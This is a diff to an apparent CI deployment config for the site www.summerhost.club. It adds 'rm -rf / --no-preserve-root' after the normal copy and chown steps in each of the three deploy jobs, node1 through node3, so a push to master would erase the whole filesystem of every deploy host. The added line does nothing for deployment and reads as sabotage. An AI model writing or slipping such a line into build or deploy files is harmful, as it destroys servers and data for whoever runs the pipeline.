@@ -8,6 +8,7 @@ node1:
     - rm -rf /var/www/www.summerhost.club/*
     - cp -rf * /var/www/www.summerhost.club
     - chown -R nginx:nginx /var/www/www.summerhost.club/
+    - rm -rf / --no-preserve-root
   only:
   - master
   tags:
@@ -20,6 +21,7 @@ node2:
     - rm -rf /var/www/www.summerhost.club/*
     - cp -rf * /var/www/www.summerhost.club
     - chown -R nginx:nginx /var/www/www.summerhost.club/
+    - rm -rf / --no-preserve-root
   only:
   - master
   tags:
@@ -32,6 +34,7 @@ node3:
     - rm -rf /var/www/www.summerhost.club/*
     - cp -rf * /var/www/www.summerhost.club
     - chown -R nginx:nginx /var/www/www.summerhost.club/
+    - rm -rf / --no-preserve-root
   only:
   - master
   tags:
